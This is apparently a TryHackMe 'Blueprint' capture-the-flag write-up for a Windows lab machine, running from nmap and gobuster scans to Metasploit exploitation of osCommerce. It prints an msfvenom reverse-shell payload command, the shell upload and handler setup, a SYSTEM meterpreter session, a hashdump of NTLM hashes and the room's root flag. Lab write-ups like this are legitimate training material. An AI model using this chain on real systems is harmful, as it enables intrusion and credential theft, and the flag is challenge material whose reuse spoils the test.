# TryHackMe-Blueprint

>Abdullah Rizwan | 23th September , 11:03 PM

## NMAP

```
nmap -sC -sV $IP

```

```
Nmap scan report for 10.10.37.223
Host is up (0.38s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.42 seconds

```




## Gobuster


```
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.37.223:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/23 14:30:08 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/aux (Status: 403)
/cgi-bin/ (Status: 403)
/com2 (Status: 403)
/com3 (Status: 403)
/com1 (Status: 403)
/con (Status: 403)
/licenses (Status: 403)
/lpt1 (Status: 403)
/lpt2 (Status: 403)
/nul (Status: 403)
/phpmyadmin (Status: 403)
/prn (Status: 403)
/server-status (Status: 200)
/server-info (Status: 200)
/webalizer (Status: 403)
===============================================================
2020/09/23 14:32:46 Finished

```


## PORT 8080


<img scr="https://imgur.com/BFgp2dj.png" />


I looked up on exploitdb for `osCommerce 2.4.3` and found many exploits one of which was


<img src="https://imgur.com/vMcOi7I.png" />

<img src="https://imgur.com/nUiVxuX.png"/>


For me this exploit failed since I cannot make a new installation of database and RCE depends upon this step to be finished.


## Metasploit

I looked on msfconsole if there was an exploit available

<img src="https://imgur.com/xnu5rzj.png"/>

<img src="https://imgur.com/FAjAfSx.png"/>

<img src="https://imgur.com/jKf21kZ.png"/>

Then navigate to `C:\Users\Administrator\Desktop`

root flag : `THM{aea1e3ce6fe7f89e10cea833ae009bee}`


Now we cannot load `kiwi` because it is not stabilized so we are going to create a payload 

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.94.60 LPORT=7777 -f exe > shell.exe`


Upload the payload on the machine
```
meterpreter > upload shell.exe
[*] uploading  : shell.exe -> shell.exe
[*] Uploaded -1.00 B of 72.07 KiB (-0.0%): shell.exe -> shell.exe
[*] uploaded   : shell.exe -> shell.exe
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  282    fil   2019-04-11 18:36:47 -0400  desktop.ini
100666/rw-rw-rw-  37     fil   2019-11-27 13:15:37 -0500  root.txt.txt
100777/rwxrwxrwx  73802  fil   2020-09-23 15:02:08 -0400  shell.exe

meterpreter > 


```

Start another msfconsole

```
msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set LHOST 10.8.94.60
LHOST => 10.8.94.60
msf5 exploit(multi/handler) > set LPORT 7777
LPORT => 7777
msf5 exploit(multi/handler) > 

```

### Meterpreter on unstabilized Shell

```
meterpreter > execute -f shell.exe
Process 5212 created.
meterpreter > 

```

### Meterperter for getting stablized shell


```
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.8.94.60:7777 
[*] Sending stage (176195 bytes) to 10.10.143.248
[*] Meterpreter session 1 opened (10.8.94.60:7777 -> 10.10.143.248:49167) at 2020-09-23 15:13:54 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
meterpreter > 

```
Visit Crackstation for cracking NTLM hash
